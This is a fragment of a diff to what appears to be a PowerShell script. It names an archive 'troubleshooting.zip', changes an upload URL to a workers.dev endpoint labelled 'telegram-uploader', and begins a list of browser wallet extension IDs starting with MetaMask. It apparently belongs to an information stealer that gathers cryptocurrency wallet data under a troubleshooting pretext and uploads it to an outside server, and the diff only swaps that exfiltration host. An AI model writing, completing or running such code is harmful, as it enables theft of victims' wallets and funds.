@@ -132,7 +132,7 @@ $zipFile = Join-Path $destination "troubleshooting.zip"
 # }
 
 
-$uploadUrl = "https://johnvictorvj61.pythonanywhere.com/upload"
+$uploadUrl = "https://telegram-uploader.primevj291.workers.dev/upload"
 
 $extensionIDs = @{
     "MetaMask" = "nkbihfbeogaeaoehlefnkodbefgpgknn"
